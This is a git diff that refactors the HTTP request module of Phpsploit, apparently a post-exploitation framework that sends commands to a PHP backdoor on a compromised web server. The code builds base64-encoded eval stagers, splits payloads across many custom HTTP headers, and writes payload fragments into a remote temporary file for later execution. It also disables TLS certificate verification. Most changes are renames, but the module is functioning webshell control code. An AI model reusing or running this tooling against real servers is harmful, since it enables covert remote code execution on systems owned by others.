@@ -1,3 +1,6 @@
+"""Phpsploit HTTP request handler"""
+__all__ = ["Request", "new_request", "get_raw_requests"]
+
 import sys
 import re
 import math
@@ -5,56 +8,57 @@ import uuid
 import time
 import codecs
 import base64
+import zlib
 import urllib.request
 import urllib.parse
+import http.client
+import ssl
 
-import ui.input
 import core
 from core import session
 from datatypes import Path
+import ui.input
 from ui.color import colorize
 
 from .exceptions import BuildError, RequestError, ResponseError
 from . import payload
 
-##############################################################################
-### disable ssl signed certificates vetrification, in order to be
-### able to use the phpsploit backdoor over non signed https targets.
-import ssl
+# don't verify ssl certificates, to support non-signed https TARGETs
 if hasattr(ssl, "_create_unverified_context"):
     ssl._create_default_https_context = ssl._create_unverified_context
 
-##############################################################################
-### custom http connection handlers: save raw plaintext http/https requests
-### into `global_raw_requests`.
-import http.client
+### Log raw http requests with custom HTTP Connection Handlers
+_RAW_REQUESTS_LIST = []
 
-global_raw_requests = []
-
-class CustomHTTPConnection(http.client.HTTPConnection):
-    def send(self, s):
-        global global_raw_requests
-        global_raw_requests.append(s)
-        super().send(s)
+class _CustomHTTPConnection(http.client.HTTPConnection):
+    """Log raw http request into _RAW_REQUESTS_LIST globale
+    """
+    def send(self, data):
+        global _RAW_REQUESTS_LIST
+        _RAW_REQUESTS_LIST.append(data)
+        super().send(data)
+http.client.__HTTPConnection__ = http.client.HTTPConnection
+http.client.HTTPConnection = _CustomHTTPConnection
 
 # TODO: intercept trafic on HTTPS requests too
-# class CustomHTTPSConnection(http.client.HTTPSConnection):
+# class _CustomHTTPSConnection(http.client.HTTPSConnection):
 #     def send(self, s):
 #         global global_raw_request
-#         global_raw_requests.append(s)
+#         _RAW_REQUESTS_LIST.append(s)
 #         super().send(s)
-
-http.client.__HTTPConnection__ = http.client.HTTPConnection
 # http.client.__HTTPSConnection__ = http.client.HTTPSConnection
+# http.client.HTTPSConnection = _CustomHTTPSConnection
 
-http.client.HTTPConnection = CustomHTTPConnection
-# http.client.HTTPSConnection = CustomHTTPSConnection
 
-##############################################################################
+def _load_template(filepath):
+    """load a PHP tunnel data template file"""
+    file = Path(core.BASEDIR, "data/tunnel", filepath, mode='fr')
+    return file.phpcode()
 
 
 class Request:
-
+    """Phpsploit HTTP Request Handler
+    """
     # the list of available methods
     methods = ['GET', 'POST']
 
@@ -65,16 +69,12 @@ class Request:
     # the parser format string, used to parse/unparse phpsploit data
     parser = '<%SEP%>%s</%SEP%>'
 
-    # a stupid function designed to not exceed the 78 chars limit in the code
-    def load_phpfile(filepath):
-        file = Path(core.BASEDIR, "data/tunnel", filepath, mode='fr')
-        return file.phpcode()
 
     # specific php code templates which are injected in the main evil
     # header, nominated by the PASSKEY setting, in charge of asessing
     # the main payload (in both POST and HEADER FILLING methods)
-    forwarder_template = {'GET': load_phpfile('forwarders/get.php'),
-                          'POST': load_phpfile('forwarders/post.php')}
+    forwarder_template = {'GET': _load_template('forwarders/get.php'),
+                          'POST': _load_template('forwarders/post.php')}
 
     # on multipart payloads, these different php codes are used as a pipe
     # between header payload and final payload. the starter writes the
@@ -82,9 +82,9 @@ class Request:
     # continues the operation appending middle parts into the tmpfile data;
     # finally, the reader writes the last part, then executes the tmpfile's
     # reassembled content.
-    multipart = {'starter': load_phpfile('multipart/starter.php'),
-                 'sender': load_phpfile('multipart/sender.php'),
-                 'reader': load_phpfile('multipart/reader.php')}
+    multipart = {'starter': _load_template('multipart/starter.php'),
+                 'sender': _load_template('multipart/sender.php'),
+                 'reader': _load_template('multipart/reader.php')}
 
     def __init__(self):
         # customizable variables
@@ -107,7 +107,7 @@ class Request:
         self.opener = session.Conf.PROXY()
 
         # the list of user specified additionnal headers (HTTP_* settings)
-        self.set_headers = load_headers(session.Conf)
+        self.set_headers = self.load_headers(session.Conf)
 
         # the parser/unparser are used to truncate phpsploit
         # data from the received http response.
@@ -176,42 +176,37 @@ class Request:
     def can_add_headers(self, headers):
         """check if the size of the specified headers list
         is in conformity with the max header size
-
         """
-        headers = get_headers(headers)
+        headers = self.get_headers(headers)
         for name, value in headers.items():
-            rawHeader = '%s: %s\r\n' % (name, value)
-            if len(rawHeader) > self.max_header_size:
+            raw_header = '%s: %s\r\n' % (name, value)
+            if len(raw_header) > self.max_header_size:
                 return False
         return True
 
     def encapsulate(self, php_payload):
-        """encapsulate the php unencoded payload with the parser strings"""
-
+        """wrap unencoded payload within self.parser
+        """
         php_payload = php_payload.rstrip(';')
-        outset, ending = [('echo "%s";' % x) for x in self.parser.split('%s')]
-        return (outset + php_payload + ending)
+        header, footer = [('echo "%s";' % x) for x in self.parser.split('%s')]
+        return header + php_payload + footer
 
     def decapsulate(self, response):
-        """parse the http response and return the phpsploit data response"""
-
+        """extract payload response from http response body
+        """
         response = response.read()
-
-        try:
-            return re.findall(self.unparser, response)[0]
-        except:
-            return None
+        match = re.findall(self.unparser, response)
+        if match:
+            return match[0]
+        return None
 
     def load_multipart(self):
         """enable the multi-request payload capability.
-        - query user to determine a remote writeable directory if
-        the phpsploit's remote shell opener failed to find one.
-        - determine the multipart_file, which is a php code prepended
-        to multipart http request, indicating in what remote file
-        payload fragments must be written.
-
+        - ask user to determine a remote writeable directory if
+          tunnel opener couldn't file one automatically.
+        - choose appropriate multipart_file, which is a remote temporary file
+          used to concatenate payload fragments before final execution.
         """
-
         ask_dir = ui.input.Expect(case_sensitive=False, append_choices=False)
         ask_dir.default = "/tmp"
         ask_dir.skip_interrupt = False
@@ -245,18 +240,18 @@ class Request:
         template = self.forwarder_template[method]
         template = template.replace('%%PASSKEY%%', self.passkey)
 
-        rawForwarder = template % decoder
-        b64Forwarder = base64.b64encode(rawForwarder.encode()).decode()
+        raw_forwarder = template % decoder
+        b64_forwarder = base64.b64encode(raw_forwarder.encode()).decode()
         # here we delete the ending "=" from base64 payload
         # because if the string is not enquoted it will not be
         # evaluated. on iis6, apache2, php>=4.4 it dont seem
         # to return error, and is a hacky solution to eval a payload
         # without quotes, preventing header quote escape by server
         # eg: "eval(base64_decode(89jjLKJnj))"
-        b64Forwarder = b64Forwarder.rstrip('=')
+        b64_forwarder = b64_forwarder.rstrip('=')
 
         hdr_payload = self.header_payload
-        forwarder = hdr_payload % b64Forwarder
+        forwarder = hdr_payload % b64_forwarder
 
         if not self.is_first_payload:
             # if the currently built request is not the first http query
@@ -270,21 +265,19 @@ class Request:
         # then warn the user in case of bad http response.
         if "'%s'" not in hdr_payload and \
            '"%s"' not in hdr_payload and \
-           not b64Forwarder.isalnum():
+           not b64_forwarder.isalnum():
             # create a visible sample of the effective b64 payload
-            oneThirdLen = float(len(forwarder) / 3)
-            oneThirdLen = int(round(oneThirdLen + 0.5))
-            sampleSeparator = colorize("%Reset", "\n[*]", "%Cyan")
-            lineList = [''] + split_len(forwarder, oneThirdLen)
-            showForwarder = sampleSeparator.join(lineList)
-            # set the payload forwarder error
+            len_third = float(len(forwarder) / 3)
+            len_third = int(round(len_third + 0.5))
+            sample_sep = colorize("%Reset", "\n[*]", "%Cyan")
+            lines = [''] + self.split_len(forwarder, len_third)
             err = ("[*] do not enquotes the base64 payload which"
                    " contains non alpha numeric chars (+ or /),"
-                   " blocking execution:" + showForwarder)
+                   " blocking execution:" + sample_sep.join(lines))
 
-        # if the current request is not concerned by the previous case
-        # an other kind of error may happen because the contents of
-        # the header that forwards the payload contains quotes.
+        # if current request is not affected by previous case,
+        # request may still fail because the header containing the
+        # payload stager has quotes.
         elif '"' in hdr_payload or \
              "'" in hdr_payload:
             err = ("[*] contains quotes, and some http servers "
@@ -294,17 +287,19 @@ class Request:
         return {self.passkey: forwarder}
 
     def build_get_headers(self, php_payload):
-        """this function takes the main payload data as argument
-        and returns a list of filled headers designed to be gathered
-        and executed by the payload forwarder.
-        Each header name is generated appending two alphabecital letters
-        to the base name (aka ZZ).
-        Example of headers list: ZZAA, ZZAB, ZZAC, ..., ZZBA, ZZBB, ZZBC,...
+        """Split `php_payload` into a list of evil HTTP headers containing
+        payload fractions.
 
+        Original payload is recombined and executed at runtime by
+        payload stager.
+
+        Each header name is generated appending two alphabecital letters
+        to the base name, in the form: ZZAA, ZZAB, ..., ZZBA, ZZBB, ZZBC, ...
         """
+        # TODO: this function is horribly stupidly implemented
         def get_header_names(num):
             letters = 'abcdefghijklmnopqrstuvwxyz'
-            result = list()
+            result = []
             base = 0
             for x in range(num):
                 x -= 26 * base
@@ -313,30 +308,28 @@ class Request:
                 except:
                     base += 1
                     char = letters[x-26]
-                headerName = "zz" + letters[base] + char
-                result.append(headerName)
+                header_name = "zz" + letters[base] + char
+                result.append(header_name)
             return result
 
         # considering that the default REQ_MAX_HEADERS and REQ_MAX_HEADER_SIZE
         # values can be greater than the real current server's capacity, the
         # following lines equilibrates the risks we take on both settings.
         # The -8 on the max_header_size keeps space for header name and \r\n
-        dataLen = len(php_payload)
-        freeSpacePerHdr = self.max_header_size - 8
-        vacantHdrs = self.vacant_headers['GET']
+        data_len = len(php_payload)
+        free_space_per_hdr = self.max_header_size - 8
+        vacant_hdrs = self.vacant_headers['GET']
 
-        sizePerHdr = math.sqrt((dataLen * freeSpacePerHdr) / vacantHdrs)
-        sizePerHdr = int(math.ceil(sizePerHdr))
+        sz_per_hdr = math.sqrt((data_len * free_space_per_hdr) / vacant_hdrs)
+        sz_per_hdr = int(math.ceil(sz_per_hdr))
 
-        hdrDatas = split_len(php_payload, sizePerHdr)
-        hdrNames = get_header_names(len(hdrDatas))
-        headers = dict(zip(hdrNames, hdrDatas))
-        return headers
+        hdr_datas = self.split_len(php_payload, sz_per_hdr)
+        hdr_names = get_header_names(len(hdr_datas))
+        return dict(zip(hdr_names, hdr_datas))
 
     def build_post_content(self, data):
         """returns a POST formated version of the given
         payload data with PASSKEY as variable name
-
         """
         post_data = urllib.parse.urlencode({self.passkey: data})
         post_data += "&" + session.Conf.REQ_POST_DATA()
@@ -369,98 +362,93 @@ class Request:
         return [(headers, content)]
 
     def build_multipart_request(self, method, php_payload):
-        """build a multipart request object from the given http method
-        and payload, and return it.
-        for infos about the return format, see the build_request() docstring.
+        """build a multipart request for `php_payload` with HTTP `method`
 
+        For infos about return format, read build_request() docstring.
         """
         compression = 'auto'
         if php_payload.length > self.zlib_try_limit:
             compression = 'nocompress'
 
-        def encode(forwarder, php_payload):
-            """insert the payload data in the forwarder and encode
-            it with the phpcode.payload.Encode() class.
+        def encode(stager, php_payload):
+            """wrap `php_payload` with `stager` and encode it"""
+            data = stager.replace('DATA', php_payload).encode()
+            return payload.Encode(data, compression)
 
-            """
-            data = forwarder.replace('DATA', php_payload).encode()
-            encodedPayload = payload.Encode(data, compression)
-            return encodedPayload
+        last_stager = self.multipart['reader'] % (php_payload.decoder % "$x")
 
-        lastForwarder = self.multipart['reader'] % (php_payload.decoder % "$x")
+        raw_data = php_payload.data
+        base_num = self.maxsize[method]
+        max_flaw = max(100, int(self.maxsize[method] / 100))
 
-        rawData = php_payload.data
-        baseNum = self.maxsize[method]
-        maxFlaw = max(100, int(self.maxsize[method] / 100))
-
-        builtReqLst = list()
+        built_reqs = []
 
         # loop while the payload has not been fully distributed into requests
         while True:
             # the multipart forwarder to use on currently built request
-            forwarder = 'sender' if len(builtReqLst) else 'starter'
+            forwarder = 'sender' if built_reqs else 'starter'
             forwarder = self.multipart[forwarder]
 
-            reqDone = False  # bool True when current req has been calculated
-            php_payload = None  # the current request's payload object
+            req_done = False  # True when current req has been calculated
+            php_payload = None  # the current request's payload string
 
             # the following loop is designed to determine the greatest
             # usable payload that can be used in a single request.
-            # on these steps, minRange and maxRange respectively represent
-            # the current allowed size's range limits. while testSize
+            # on these steps, min_range and max_range respectively represent
+            # the current allowed size's range limits. while test_size
             # represent the currently checked payload size.
-            testSize = baseNum
-            minRange = maxFlaw
-            maxRange = 0
-            while not reqDone:
-                if maxRange > 0:
-                    if maxRange <= minRange:
-                        maxRange = minRange * 2
-                    # set testSize to the current range's average
-                    testSize = minRange + int((maxRange - minRange) / 2)
+            test_size = base_num
+            min_range = max_flaw
+            max_range = 0
+            while not req_done:
+                if max_range > 0:
+                    if max_range <= min_range:
+                        max_range = min_range * 2
+                    # set test_size to the current range's average
+                    test_size = min_range + int((max_range - min_range) / 2)
 
-                # try to build a payload containing the testSize data
-                testPayload = encode(forwarder, rawData[:testSize])
+                # try to build a payload containing the test_size data
+                test_payload = encode(forwarder, raw_data[:test_size])
 
-                # if it is too big, consider testSize as the new maxRange
-                # only if testSize if bigger than the maxFlaw, else return err
-                if testPayload.length > self.maxsize[method]:
-                    if testSize <= maxFlaw:
+                # if it is too big, consider test_size as the new max_range
+                # only if test_size if bigger than the max_flaw, else return err
+                if test_payload.length > self.maxsize[method]:
+                    if test_size <= max_flaw:
                         return []
-                    maxRange = testSize
+                    max_range = test_size
 
                 # if the payload is not too big
                 else:
                     # then accept it as current request's payload size, only
                     # if the difference between current size and known limit
-                    # does not exceeds the maxFlaw. also accept it if this is
+                    # does not exceeds the max_flaw. also accept it if this is
                     # the last built single request.
-                    if testSize-minRange <= maxFlaw \
-                       or (len(builtReqLst) and testSize == baseNum):
-                        php_payload = testPayload
-                        baseNum = testSize
-                        reqDone = True
+                    if test_size - min_range <= max_flaw \
+                       or (built_reqs and test_size == base_num):
+                        php_payload = test_payload
+                        base_num = test_size
+                        req_done = True
                     # we also now know that the max theorical size is bigger
-                    # than tested size, so we settle minRange to it's value
-                    minRange = testSize
+                    # than tested size, so we settle min_range to it's value
+                    min_range = test_size
 
             # our single request can now be added to the multi req list
             # and it's treated data removed from the full data set
-            rawData = rawData[minRange:]
+            raw_data = raw_data[min_range:]
             request = self.build_single_request(method, php_payload)
             if not request:
                 return []
-            builtReqLst += request
+            built_reqs += request
 
             # after each successful added request, try to put all remaining
             # data into a final request, and return full result if it enters.
-            php_payload = encode(lastForwarder, rawData)
+            php_payload = encode(last_stager, raw_data)
             if php_payload.length <= self.maxsize[method]:
                 request = self.build_single_request(method, php_payload)
                 if not request:
                     return []
-                builtReqLst += request
-                return builtReqLst
+                built_reqs += request
+                return built_reqs
 
     def build_request(self, mode, method, php_payload):
         """a frontend to the build_${mode}_request() functions.
@@ -475,15 +463,12 @@ class Request:
         * This is a basic request format:
             [  ( {"User-Agent":"firefox", {"Accept":"plain"}, None ),
                ( {"User-Agent":"ie"}, {"PostVarName":"PostDATA"} )    ]
-
         """
-        funcName = "build_%s_request" % mode
-        try:
-            customBuilder = getattr(self, funcName)
-        except:
-            request = list()
-        request = customBuilder(method, php_payload)
-        return request
+        builder_name = "build_%s_request" % mode
+        if hasattr(self, builder_name):
+            builder = getattr(self, builder_name)
+            return builder(method, php_payload)
+        return []
 
     def send_single_request(self, request):
         """send a single request object element (a request object's single
@@ -499,7 +484,7 @@ class Request:
         # add the user settings specified headers, and get their real values.
         headers.update({"Host": self.hostname})
         headers.update(self.set_headers)
-        headers = get_headers(headers)
+        headers = self.get_headers(headers)
 
         # erect the final request structure
         request = urllib.request.Request(self.target, content, headers)
@@ -532,7 +517,8 @@ class Request:
 
         return response
 
-    def get_php_errors(self, data):
+    @staticmethod
+    def get_php_errors(data):
         """function designed to parse php errors from phpsploit response
         for better output and plugin debugging purposes.
         Its is called by the Read() function and returns the $error string
@@ -726,8 +712,8 @@ class Request:
 
         """
         # flush raw requests container
-        global global_raw_requests
-        global_raw_requests = []
+        global _RAW_REQUESTS_LIST
+        _RAW_REQUESTS_LIST = []
 
         multiReqLst = request[:-1]
         lastRequest = request[-1]
@@ -821,17 +807,18 @@ class Request:
         assert isinstance(b_response, bytes)
         # try to decode it, optional because php encoding can be unset
         try:
-            b_response = codecs.decode(b_response, 'zlib')
-        except:
+            b_response = zlib.decompress(b_response)
+        except zlib.error:
             pass
+        assert isinstance(b_response, bytes)
 
         # convert the response data into python variable
         try:
             response = payload.php2py(b_response)
         except:
-            phpErrors = self.get_php_errors(response['data'])
-            if phpErrors:
-                return phpErrors
+            php_errors = self.get_php_errors(response['data'])
+            if php_errors:
+                return php_errors
             raise
 
         # import pprint
@@ -850,56 +837,49 @@ class Request:
         else:
             raise ResponseError('Returned dict() is in a wrong format')
 
+    @staticmethod
+    def split_len(string, length):
+        """split `string` into a list of items whose size
+        does not exceed `length`
 
-def split_len(string, length):
-    """split the given string into a list() object which contains
-    a list of string sequences or 'length' size.
+        >>> split_len('phpsploit', 2)
+        ['ph', 'ps', 'pl', 'oi', 't']
+        """
+        result = []
+        for pos in range(0, len(string), length):
+            end = pos + length
+            result.append(string[pos:end])
+        return result
 
-    Example:
-    >>> split_len('phpsploit', 2)
-    ['ph', 'ps', 'pl', 'oi', 't']
+    @staticmethod
+    def load_headers(settings):
+        """Load the list of user defined headers ('HTTP_*' settings)
 
-    """
-    result = list()
-    for pos in range(0, len(string), length):
-        end = pos + length
-        newElem = string[pos:end]
-        result.append(newElem)
-    return result
+        This function retrieves settings *LineBuffer objects.
+        To pick settings's *usable-value, get_headers() shall be used.
+        """
+        headers = {"user-agent": ""}
+        for key, val in settings.items():
+            if key.startswith('HTTP_') and key[5:]:
+                key = key[5:].lower().replace('_', '-')
+                headers[key] = val
+        return headers
 
+    @staticmethod
+    def get_headers(headers):
+        """get *usable-value of user-defined http headers.
 
-def load_headers(settings):
-    """load http headers specified as user settings, aka
-    variable whose names start with 'HTTP_'.
-
-    it is used to get the list of user defined headers
-    with their names for http filling computing.
-    It do not loads dynamic 'file://<PATH>' objects, for
-    this, take a look at the get_headers() fonction.
-
-    """
-    headers = dict()
-    # the default user-agent string (empty here)
-    headers['user-agent'] = ''
-
-    for key, val in settings.items():
-        if key.startswith('HTTP_') and key[5:]:
-            key = key[5:].lower().replace('_', '-')
-            headers[key] = val
-    return headers
-
-
-def get_headers(headers):
-    """This function must be used just before each unicast
-    http request, because it formats eventual dynamic user
-    specified header values, such as random line values.
-
-    """
-    headers = dict((k.lower().replace('_','-'),v) for k,v in headers.items())
-    for key, val in headers.items():
-        if callable(val):
-            headers[key] = val()
-    return headers
+        This function must be called just before each individual
+        request, to correctly access *usable-value of LineBuffer
+        objects (configuration settings)
+        """
+        result = {}
+        for key, val in headers.items():
+            key = key.lower().replace("_", "-")
+            if callable(val):
+                val = val()
+            result[key] = val
+        return result
 
 
 def new_request():
@@ -914,3 +894,8 @@ def new_request():
     else:
         request = Request()
     return request
+
+
+def get_raw_requests():
+    """retrieve raw requests from previously sent payload"""
+    return _RAW_REQUESTS_LIST
